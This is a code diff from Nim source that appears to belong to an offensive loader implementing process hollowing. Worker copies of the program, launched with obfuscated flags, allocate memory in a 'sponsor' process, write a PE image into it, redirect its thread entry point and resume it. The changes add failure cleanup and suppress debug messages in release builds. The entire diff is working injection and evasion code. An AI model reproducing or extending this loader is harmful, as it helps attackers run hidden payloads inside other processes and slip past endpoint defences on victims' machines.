@@ -287,7 +287,7 @@ when defined(hollow5) or defined(hollow6):
         quit(0)
 
    
-proc createProcessWorker(arg: string): PPROCESS_INFORMATION =
+proc createProcessWorker(arg: string, sponsorHandle: HANDLE): PPROCESS_INFORMATION =
 
     var processCmd = getAppFilename() & arg
     
@@ -304,14 +304,14 @@ proc createProcessWorker(arg: string): PPROCESS_INFORMATION =
         NULL,
         NULL, 
         TRUE,
-        0, # CREATE_SUSPENDED,
+        0,
         NULL,
         NULL,
         addr si,
         addr pi
     ) != TRUE:
-        echo $GetLastError()
-        quit()
+        when not defined(release): echo "[-] Could not create new process"
+        onFail(sponsorHandle)     
 
     return addr pi
 
@@ -340,16 +340,16 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     # Create a mailslot
     let mailslotHandle = createMailslot(allocatedAddressMailSlot)
     if mailslotHandle == 0:
-        quit(1)
+        onFail(sponsorProcessHandle)
 
     # Allocate memory in sponsor process
     when not defined(release): echo "[*] Allocating memory in sponsor process"     
-    ppi = createProcessWorker(protectString(" -A:") & $sponsorProcessHandle)
+    ppi = createProcessWorker(protectString(" -A:") & $sponsorProcessHandle, sponsorProcessHandle)
     WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
-        quit(1)
+        onFail(sponsorProcessHandle)
 
     # Get the allocated address from the allocator process
     let newImageBaseAddress = cast[PVOID](parseInt(readMailslot(mailslotHandle)))
@@ -357,30 +357,36 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
 
     # Copy PE to sponsor process 
     when not defined(release): echo "[*] Copying PE to sponsor process"
-    ppi = createProcessWorker(protectString(" -W:") & $sponsorProcessHandle & protectString(" -N:") & $cast[int](newImageBaseAddress))
+    ppi = createProcessWorker(
+        protectString(" -W:") & $sponsorProcessHandle & protectString(" -N:") & $cast[int](newImageBaseAddress), 
+        sponsorProcessHandle
+        )
     WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not write to sponsor process"
-        quit(1)
+        onFail(sponsorProcessHandle)
 
     # Change sponsor thread Entrypoint
     when not defined(release): echo "[*] Changing thread context"
-    ppi = createProcessWorker(protectString(" -T:") & $sponsorThreadHandle & protectString(" -N:") & $cast[int](newImageBaseAddress))
+    ppi = createProcessWorker(
+        protectString(" -T:") & $sponsorThreadHandle & protectString(" -N:") & $cast[int](newImageBaseAddress),
+        sponsorProcessHandle
+        )
     WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not change thread context"
-        quit(1)
+        onFail(sponsorProcessHandle)
 
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming thread"
-    ppi = createProcessWorker(protectString(" -R:") & $sponsorThreadHandle)
+    ppi = createProcessWorker(protectString(" -R:") & $sponsorThreadHandle, sponsorProcessHandle)
     WaitForSingleObject(ppi.hProcess, 8 * 1000)
     discard GetExitCodeProcess(ppi.hProcess, addr res)
     if res != 0:
         when not defined(release): echo "[-] Could not resume thread"
-        quit(1)
+        onFail(sponsorProcessHandle)
 
  
 proc hollow456Worker*(peStr: string): bool =
